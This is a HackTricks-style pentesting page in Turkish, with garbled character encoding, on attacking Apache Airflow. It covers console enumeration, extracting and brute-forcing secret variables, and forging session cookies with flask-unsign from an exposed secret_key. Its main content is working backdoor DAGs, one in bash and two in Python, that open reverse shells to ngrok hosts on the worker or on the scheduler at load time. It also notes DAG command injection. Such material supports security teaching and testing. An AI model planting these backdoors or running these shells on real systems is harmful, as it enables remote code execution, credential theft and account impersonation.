# Apache Airflow GÃ¼venliÄŸi

<details>

{% hint style="success" %}
AWS Hacking'Ä± Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'Ä± Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## Temel Bilgiler

[**Apache Airflow**](https://airflow.apache.org), **veri boru hatlarÄ± veya iÅŸ akÄ±ÅŸlarÄ±nÄ± dÃ¼zenleme ve zamanlama** platformu olarak hizmet verir. Veri boru hatlarÄ± baÄŸlamÄ±nda "dÃ¼zenleme" terimi, Ã§eÅŸitli kaynaklardan gelen karmaÅŸÄ±k veri iÅŸ akÄ±ÅŸlarÄ±nÄ± dÃ¼zenleme, koordine etme ve yÃ¶netme sÃ¼recini ifade eder. Bu dÃ¼zenlenmiÅŸ veri boru hatlarÄ±nÄ±n temel amacÄ± iÅŸlenmiÅŸ ve tÃ¼ketilebilir veri kÃ¼melerini sunmaktÄ±r. Bu veri kÃ¼meleri, iÅŸ zekasÄ± araÃ§larÄ±, veri bilimi ve makine Ã¶ÄŸrenme modelleri de dahil olmak Ã¼zere birÃ§ok uygulama tarafÄ±ndan yaygÄ±n bir ÅŸekilde kullanÄ±lmaktadÄ±r ve tÃ¼m bunlar bÃ¼yÃ¼k veri uygulamalarÄ±nÄ±n iÅŸleyiÅŸinde temel rol oynamaktadÄ±r.

Temelde, Apache Airflow size **bir ÅŸey olduÄŸunda** (olay, cron) **kodun yÃ¼rÃ¼tÃ¼lmesini zamanlamayÄ±** saÄŸlayacaktÄ±r.

## Yerel Laboratuvar

### Docker-Compose

Tam bir apache airflow docker ortamÄ±nÄ± baÅŸlatmak iÃ§in **docker-compose yapÄ±landÄ±rma dosyasÄ±nÄ±** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) kullanabilirsiniz. (MacOS'ta iseniz, docker VM'ye en az 6GB RAM verdiÄŸinizden emin olun).

### Minikube

Apache airflow'Ä± Ã§alÄ±ÅŸtÄ±rmanÄ±n kolay bir yolu, **minikube ile Ã§alÄ±ÅŸtÄ±rmaktÄ±r**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow YapÄ±landÄ±rmasÄ±

Airflow, yapÄ±landÄ±rmasÄ±nda **duyarlÄ± bilgileri** saklayabilir veya zayÄ±f yapÄ±landÄ±rmalar bulabilirsiniz:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflow'u saldÄ±rmadan Ã¶nce **izinlerin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±** anlamanÄ±z gerekmektedir:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## SaldÄ±rÄ±lar

### Web Konsolu NumaralandÄ±rma

EÄŸer **web konsoluna eriÅŸiminiz varsa**, aÅŸaÄŸÄ±daki bilgilerin bazÄ±larÄ±na veya tÃ¼mÃ¼ne eriÅŸebilirsiniz:

* **DeÄŸiÅŸkenler** (Ã–zel duyarlÄ± bilgiler burada saklanabilir)
* **BaÄŸlantÄ±lar** (Ã–zel duyarlÄ± bilgiler burada saklanabilir)
* Onlara `http://<airflow>/connection/list/` adresinden eriÅŸin
* [**YapÄ±landÄ±rma**](./#airflow-configuration) (Gizli bilgiler, **`secret_key`** ve ÅŸifreler burada saklanabilir)
* KullanÄ±cÄ±larÄ± ve rolleri listele
* **Her DAG'Ä±n kodu** (ilginÃ§ bilgiler iÃ§erebilir)

### DeÄŸiÅŸken DeÄŸerlerini Almak

DeÄŸiÅŸkenler Airflow'da saklanabilir, bÃ¶ylece **DAG'lar** deÄŸerlerine **eriÅŸebilir**. DiÄŸer platformlarÄ±n sÄ±rlarÄ±na benzer. Yeterli **izinlere** sahipseniz, bunlara GUI'de `http://<airflow>/variable/list/` adresinden eriÅŸebilirsiniz.\
Airflow varsayÄ±lan olarak deÄŸiÅŸkenin deÄŸerini GUI'de gÃ¶sterecektir, ancak [**bu**](https://marclamberti.com/blog/variables-with-apache-airflow/) baÄŸlantÄ±ya gÃ¶re, GUI'de **deÄŸerinin** **yÄ±ldÄ±zlar** olarak gÃ¶rÃ¼neceÄŸi **deÄŸiÅŸkenlerin listesini** ayarlamak mÃ¼mkÃ¼ndÃ¼r.

![](<../../.gitbook/assets/image (164).png>)

Ancak, bu **deÄŸerler** hala **CLI** (DB eriÅŸimine ihtiyacÄ±nÄ±z var), **keyfi DAG** yÃ¼rÃ¼tme, **API**'ye deÄŸiÅŸkenler uÃ§ noktasÄ±na eriÅŸim (API etkinleÅŸtirilmelidir) ve **GUI**'den bile **alÄ±nabilir**.\
Bu deÄŸerlere GUI'den eriÅŸmek iÃ§in sadece eriÅŸmek istediÄŸiniz deÄŸiÅŸkenleri **seÃ§in** ve **Eylemler -> DÄ±ÅŸa Aktar**'a tÄ±klayÄ±n.\
BaÅŸka bir yol, **gizli deÄŸeri** almak iÃ§in **arama filtresini** kullanarak **kaba kuvvet** uygulamaktÄ±r:

![](<../../.gitbook/assets/image (152).png>)

### Yetki YÃ¼kseltme

EÄŸer **`expose_config`** yapÄ±landÄ±rmasÄ± **True** olarak ayarlanmÄ±ÅŸsa, **KullanÄ±cÄ±** rolÃ¼nden ve **yukarÄ±sÄ±ndan** olanlar **webdeki yapÄ±yÄ± okuyabilir**. Bu yapÄ±landÄ±rmada, **`secret_key`** gÃ¶rÃ¼nÃ¼r, bu da demektir ki bu geÃ§erli olan herhangi bir kullanÄ±cÄ±, **kendi imzalÄ± Ã§erezini oluÅŸturarak baÅŸka herhangi bir kullanÄ±cÄ± hesabÄ±nÄ± taklit edebilir**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Arka KapÄ±sÄ± (Airflow iÅŸÃ§isinde RCE)

EÄŸer **DAG'larÄ±n kaydedildiÄŸi yere** **yazma eriÅŸiminiz** varsa, sadece size bir **ters kabuk gÃ¶nderecek bir tane oluÅŸturabilirsiniz.**\
Bu ters kabuÄŸun bir **airflow iÅŸÃ§isi konteyneri iÃ§inde** yÃ¼rÃ¼tÃ¼leceÄŸini unutmayÄ±n:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Arka KapÄ±sÄ± (Airflow zamanlayÄ±cÄ±sÄ±nda Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma)

EÄŸer bir ÅŸeyin **kodun kÃ¶kÃ¼nde Ã§alÄ±ÅŸtÄ±rÄ±lacak ÅŸekilde ayarlanÄ±rsa**, bu yazÄ±nÄ±n hazÄ±rlandÄ±ÄŸÄ± sÄ±rada, bunun **DAG klasÃ¶rÃ¼ne yerleÅŸtirildikten birkaÃ§ saniye sonra zamanlayÄ±cÄ± tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±** unutulmamalÄ±dÄ±r.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG OluÅŸturma

EÄŸer **DAG kÃ¼mesi iÃ§inde bir makine ele geÃ§irirseniz**, `dags/` klasÃ¶rÃ¼nde yeni **DAG betikleri** oluÅŸturabilir ve bu betikler **DAG kÃ¼mesi iÃ§indeki diÄŸer makinelerde Ã§oÄŸaltÄ±lacaktÄ±r**.

### DAG Kod Enjeksiyonu

GUI'den bir DAG'Ä± Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ±zda ona **argÃ¼manlar geÃ§irebilirsiniz**.\
Bu nedenle, DAG uygun ÅŸekilde kodlanmamÄ±ÅŸsa **Komut Enjeksiyonuna aÃ§Ä±k olabilir**.\
Bu, bu CVE'de meydana gelen ÅŸeydir: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

**DAG'larda komut enjeksiyonlarÄ±nÄ± aramaya baÅŸlamak iÃ§in bilmeniz gereken tek ÅŸey**, **parametrelerin** kodla **`dag_run.conf.get("param_name")`** ÅŸeklinde **eriÅŸildiÄŸidir**.

AyrÄ±ca, aynÄ± zafiyet **deÄŸiÅŸkenlerle** de meydana gelebilir (unutmayÄ±n ki yeterli izinlerle GUI'de **deÄŸiÅŸkenlerin deÄŸerini kontrol edebilirsiniz**). DeÄŸiÅŸkenlere **ÅŸu ÅŸekilde eriÅŸilir**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
EÄŸer Ã¶rneÄŸin bir bash komutu iÃ§inde kullanÄ±lÄ±yorlarsa, bir komut enjeksiyonu gerÃ§ekleÅŸtirebilirsiniz.

<details>

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}
